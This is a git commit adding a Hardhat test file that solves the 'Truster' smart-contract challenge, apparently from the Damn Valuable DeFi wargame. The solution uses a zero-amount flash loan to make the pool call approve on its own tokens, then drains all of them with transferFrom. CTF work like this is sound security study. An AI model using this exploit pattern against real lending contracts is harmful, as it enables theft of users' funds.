75f3e5387cf286af14cd216612fc07efaea9dc67
Tim <timonyang@gmail.com>
2023-03-19 22:58:46 -0700

    truster challenge

---
+++ test/truster/truster.challenge.js
@@ -0,0 +1,56 @@
+const { ethers } = require("hardhat")
+const { expect } = require("chai")
+const { TrusterABI } = require("../../constants/index.js")
+
+describe("[Challenge] Truster", function () {
+    let deployer, player
+    let token, pool
+
+    const TOKENS_IN_POOL = 1000000n * 10n ** 18n
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        ;[deployer, player] = await ethers.getSigners()
+
+        token = await (
+            await ethers.getContractFactory("DamnValuableToken", deployer)
+        ).deploy()
+        pool = await (
+            await ethers.getContractFactory("TrusterLenderPool", deployer)
+        ).deploy(token.address)
+        expect(await pool.token()).to.eq(token.address)
+
+        await token.transfer(pool.address, TOKENS_IN_POOL)
+        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL)
+
+        expect(await token.balanceOf(player.address)).to.equal(0)
+    })
+
+    it("Execution", async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const iface = new ethers.utils.Interface(TrusterABI.abi)
+        const encodedTransferFrom = iface.encodeFunctionData("approve", [
+            player.address,
+            TOKENS_IN_POOL
+        ])
+
+        await pool.flashLoan(
+            0,
+            player.address, // borrower
+            token.address, // target
+            encodedTransferFrom
+        )
+
+        await token
+            .connect(player)
+            .transferFrom(pool.address, player.address, TOKENS_IN_POOL)
+    })
+
+    after(async function () {
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+        // Player has taken all tokens from the pool
+        expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL)
+        expect(await token.balanceOf(pool.address)).to.equal(0)
+    })
+})
